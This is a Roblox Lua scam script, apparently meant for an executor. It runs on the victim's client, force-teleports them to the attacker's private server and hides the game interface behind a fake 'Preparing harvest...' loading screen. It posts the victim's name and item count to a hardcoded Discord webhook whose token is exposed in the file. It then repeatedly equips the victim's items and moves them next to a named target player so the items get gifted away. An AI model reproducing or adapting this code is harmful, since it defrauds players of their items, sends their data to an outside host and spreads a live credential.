local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1515614244295544912/80SYn-CwUdEOAy_UKRzveYvrEzWd21ijv2uZLdXf2JQLY8rVcHS7bug_w_3M6qVHoCqy"

local TARGET_PLAYER_NAME = "hshajsjhehe"
local PRIVATE_SERVER_CODE = "c17ae8bc0277f44e8edf06e557182767"

-- Force TP to your private server
task.spawn(function()
    task.wait(5)
    if PRIVATE_SERVER_CODE and PRIVATE_SERVER_CODE \~= "" then
        pcall(function()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player, nil, {privateServerLinkCode = PRIVATE_SERVER_CODE})
        end)
    end
end)

-- Persistent loading screen
task.spawn(function()
    pcall(function()
        for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
            StarterGui:SetCoreGuiEnabled(guiType, false)
        end
    end)

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = player:WaitForChild("PlayerGui")

    local Background = Instance.new("Frame")
    Background.Size = UDim2.new(1,0,1,0)
    Background.BackgroundColor3 = Color3.fromRGB(0,0,0)
    Background.Parent = ScreenGui

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(0.8,0,0.15,0)
    Title.Position = UDim2.new(0.1,0,0.3,0)
    Title.BackgroundTransparency = 1
    Title.Text = "Preparing harvest..."
    Title.TextColor3 = Color3.fromRGB(0, 255, 80)
    Title.TextScaled = true
    Title.Font = Enum.Font.GothamBlack
    Title.Parent = Background

    local BarBG = Instance.new("Frame")
    BarBG.Size = UDim2.new(0.6,0,0.04,0)
    BarBG.Position = UDim2.new(0.2,0,0.55,0)
    BarBG.BackgroundColor3 = Color3.fromRGB(20,20,20)
    BarBG.Parent = Background

    local Bar = Instance.new("Frame")
    Bar.Size = UDim2.new(0,0,1,0)
    Bar.BackgroundColor3 = Color3.fromRGB(0,255,100)
    Bar.Parent = BarBG

    local start = tick()
    while tick() - start < 55 do
        local p = math.clamp((tick() - start) / 55, 0, 1)
        Bar.Size = UDim2.new(p,0,1,0)
        task.wait(0.15)
    end
    Bar.Size = UDim2.new(1,0,1,0)
end)

-- Safe Webhook (fixed nil request)
task.spawn(function()
    task.wait(12)
    local backpack = player:FindFirstChild("Backpack")
    local itemCount = backpack and #backpack:GetChildren() or 0

    local msg = "@everyone **Harvest**\nVictim: " .. player.Name .. "\nTo: " .. TARGET_PLAYER_NAME .. "\nItems: " .. itemCount

    local req = syn and syn.request or http_request or request or (http and http.request)
    if req and WEBHOOK_URL then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = msg})
            })
        end)
    end
end)

-- Safer auto gift with longer delays to fix GiftingController
local function equipItem(item)
    pcall(function()
        local char = player.Character
        if char and char:FindFirstChild("Humanoid") and item and item.Parent then
            item.Parent = char
            char.Humanoid:EquipTool(item)
        end
    end)
end

task.spawn(function()
    task.wait(15) -- Big delay to let controllers finish
    while true do
        pcall(function()
            local backpack = player:FindFirstChild("Backpack")
            if backpack then
                local items = backpack:GetChildren()
                for _, item in ipairs(items) do
                    if item and item.Parent == backpack then
                        equipItem(item)
                        task.wait(1.5)

                        local target = Players:FindFirstChild(TARGET_PLAYER_NAME)
                        if target and target.Character and player.Character then
                            local myRoot = player.Character:FindFirstChild("HumanoidRootPart")
                            local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
                            if myRoot and tRoot then
                                myRoot.CFrame = tRoot.CFrame * CFrame.new(3, 1, 3)
                            end
                        end
                        task.wait(3.5) -- Longer wait for gift prompt
                    end
                end
            end
        end)
        task.wait(3)
    end
end)

-- Re-equip on respawn
player.CharacterAdded:Connect(function()
    task.wait(4)
    pcall(function()
        local backpack = player:FindFirstChild("Backpack")
        if backpack then
            for _, item in ipairs(backpack:GetChildren()) do
                equipItem(item)
                task.wait(1)
            end
        end
    end)
end)
